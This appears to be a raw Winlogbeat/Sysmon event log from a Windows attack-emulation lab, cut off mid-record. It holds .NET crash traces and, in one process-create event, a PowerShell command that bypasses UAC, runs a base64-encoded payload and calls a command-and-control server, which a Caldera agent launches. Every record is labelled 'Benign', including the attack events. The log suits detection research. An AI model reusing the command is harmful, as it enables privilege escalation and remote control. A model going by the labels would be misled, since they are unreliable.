{"@timestamp":"2022-03-23T10:58:38.451Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Application: powershell.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.AccessViolationException\n   at System.Runtime.InteropServices.Marshal.ReadByte(IntPtr, Int32)\n   at DynamicClass.CallSite.Target(System.Runtime.CompilerServices.Closure, System.Runtime.CompilerServices.CallSite, System.Type, System.Object)\n   at DynamicClass.<ScriptBlock>(System.Runtime.CompilerServices.Closure, System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipeImpl(System.Management.Automation.ScriptBlockClauseToInvoke, Boolean, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, System.Object[])\n   at System.Management.Automation.ScriptBlock+<>c__DisplayClass57_0.<InvokeWithPipe>b__0()\n   at System.Management.Automation.Runspaces.RunspaceBase.RunActionIfNoRunningPipelinesWithThreadCheck(System.Action)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipe(Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, Boolean, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Object[])\n   at System.Management.Automation.ScriptBlock.InvokeUsingCmdlet(System.Management.Automation.Cmdlet, Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Object[])\n   at Microsoft.PowerShell.Commands.ForEachObjectCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.Pipe.AddToPipe(System.Object)\n   at System.Security.SecurityContext.Run(System.Security.SecurityContext, System.Threading.ContextCallback, System.Object)\n   at System.Management.Automation.MshCommandRuntime.WriteObject(System.Object)\n   at System.Management.Automation.Cmdlet.WriteObject(System.Object)\n   at Microsoft.PowerShell.Commands.GetProcessCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.PSScriptCmdlet.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.PSScriptCmdlet.DoEndProcessing()\n   at System.Management.Automation.CommandProcessorBase.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeHelper()\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeThreadProc()\n   at System.Management.Automation.Runspaces.PipelineThread.WorkerProc()\n   at System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object)\n   at System.Threading.ThreadHelper.ThreadStart()","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":null,"winlog":{"channel":"Application","event_id":"1026","api":"wineventlog","record_id":459,"computer_name":"win10.windomain.local","provider_name":".NET Runtime","provider_guid":null,"keywords":["Classic"],"event_data":{"param2":null,"param1":"Application: powershell.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.AccessViolationException\n   at System.Runtime.InteropServices.Marshal.ReadByte(IntPtr, Int32)\n   at DynamicClass.CallSite.Target(System.Runtime.CompilerServices.Closure, System.Runtime.CompilerServices.CallSite, System.Type, System.Object)\n   at DynamicClass.<ScriptBlock>(System.Runtime.CompilerServices.Closure, System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipeImpl(System.Management.Automation.ScriptBlockClauseToInvoke, Boolean, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, System.Object[])\n   at System.Management.Automation.ScriptBlock+<>c__DisplayClass57_0.<InvokeWithPipe>b__0()\n   at System.Management.Automation.Runspaces.RunspaceBase.RunActionIfNoRunningPipelinesWithThreadCheck(System.Action)\n   at System.Management.Automation.ScriptBlock.InvokeWithPipe(Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Management.Automation.Internal.Pipe, System.Management.Automation.InvocationInfo, Boolean, System.Collections.Generic.List`1<System.Management.Automation.PSVariable>, System.Collections.Generic.Dictionary`2<System.String,System.Management.Automation.ScriptBlock>, System.Object[])\n   at System.Management.Automation.ScriptBlock.InvokeUsingCmdlet(System.Management.Automation.Cmdlet, Boolean, ErrorHandlingBehavior, System.Object, System.Object, System.Object, System.Object[])\n   at Microsoft.PowerShell.Commands.ForEachObjectCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.Pipe.AddToPipe(System.Object)\n   at System.Security.SecurityContext.Run(System.Security.SecurityContext, System.Threading.ContextCallback, System.Object)\n   at System.Management.Automation.MshCommandRuntime.WriteObject(System.Object)\n   at System.Management.Automation.Cmdlet.WriteObject(System.Object)\n   at Microsoft.PowerShell.Commands.GetProcessCommand.ProcessRecord()\n   at System.Management.Automation.CommandProcessor.ProcessRecord()\n   at System.Management.Automation.CommandProcessorBase.DoExecute()\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.PSScriptCmdlet.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.PSScriptCmdlet.DoEndProcessing()\n   at System.Management.Automation.CommandProcessorBase.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.PipelineOps.InvokePipeline(System.Object, Boolean, System.Management.Automation.CommandParameterInternal[][], System.Management.Automation.Language.CommandBaseAst[], System.Management.Automation.CommandRedirection[][], System.Management.Automation.Language.FunctionContext)\n   at System.Management.Automation.Interpreter.ActionCallInstruction`6[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]].Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.Interpreter.Run(System.Management.Automation.Interpreter.InterpretedFrame)\n   at System.Management.Automation.Interpreter.LightLambda.RunVoid1[[System.__Canon, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]](System.__Canon)\n   at System.Management.Automation.DlrScriptCommandProcessor.RunClause(System.Action`1<System.Management.Automation.Language.FunctionContext>, System.Object, System.Object)\n   at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n   at System.Management.Automation.CommandProcessorBase.DoComplete()\n   at System.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(System.Management.Automation.CommandProcessorBase)\n   at System.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(System.Object)\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeHelper()\n   at System.Management.Automation.Runspaces.LocalPipeline.InvokeThreadProc()\n   at System.Management.Automation.Runspaces.PipelineThread.WorkerProc()\n   at System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)\n   at System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object)\n   at System.Threading.ThreadHelper.ThreadStart()"}},"event":{"kind":"event","provider":".NET Runtime","created":"2022-03-23T10:58:38.902Z","code":"1026"},"log":{"level":"error"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:38.694Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Faulting application name: powershell.exe, version: 10.0.18362.1, time stamp: 0xfce6740d\nFaulting module name: mscorlib.ni.dll, version: 4.8.4018.0, time stamp: 0x5d4a6683\nException code: 0xc0000005\nFault offset: 0x00000000005585a5\nFaulting process id: 0x1438\nFaulting application start time: 0x01d83ea4f28c83b8\nFaulting application path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFaulting module path: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\ec23d1294499b4ffba61f212cb1217cd\\mscorlib.ni.dll\nReport Id: 6789078d-a7f7-416d-acf7-2e3fe4954eec\nFaulting package full name: \nFaulting package-relative application ID: ","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":null,"winlog":{"channel":"Application","event_id":"1000","api":"wineventlog","record_id":460,"computer_name":"win10.windomain.local","provider_name":"Application Error","provider_guid":null,"keywords":["Classic"],"event_data":{"param2":"10.0.18362.1","param1":"powershell.exe"}},"event":{"kind":"event","provider":"Application Error","created":"2022-03-23T10:58:38.902Z","code":"1000"},"log":{"level":"error"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.220Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:58:37.220\nProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nProcessId: 5344\nImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetFilename: C:\\Users\\vagrant\\update.ps1\nCreationUtcTime: 2022-03-23 10:58:37.220\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":null,"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8617,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.914Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.225Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:58:37.225\nProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nProcessId: 5344\nImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetFilename: C:\\Users\\vagrant\\Invoke-BypassUACTokenManipulation.ps1\nCreationUtcTime: 2022-03-23 10:58:37.225\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":null,"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8618,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.228Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:58:37.228\nProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nProcessId: 5176\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;Move-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\\\"Import-Module $env:APPDATA\\update.ps1;update('http://192.168.56.104:8888')\\\"));Invoke-BypassUACTokenManipulation -Arguments \\\"-nop -exec bypass -EncodedCommand $pcode\\\" -Verbose\"\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\nParentProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nParentProcessId: 5344\nParentImage: C:\\Users\\Public\\sandcat.go-windows.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.go-windows.exe\" -server http://192.168.56.104:8888 -group red -listenP2P -v \nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5176,"thread":null,"entity_id":"{04787c88-fd5d-623a-6301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8619,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.228Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 10:58:37.228\nSourceProcessGUID: {04787c88-f96f-623a-ea00-000000000c00}\nSourceProcessId: 5344\nSourceThreadId: 1692\nSourceImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetProcessGUID: {04787c88-fd5d-623a-6301-000000000c00}\nTargetProcessId: 5176\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.go-windows.exe+644be\nSourceUser: WIN10\\vagrant\nTargetUser: 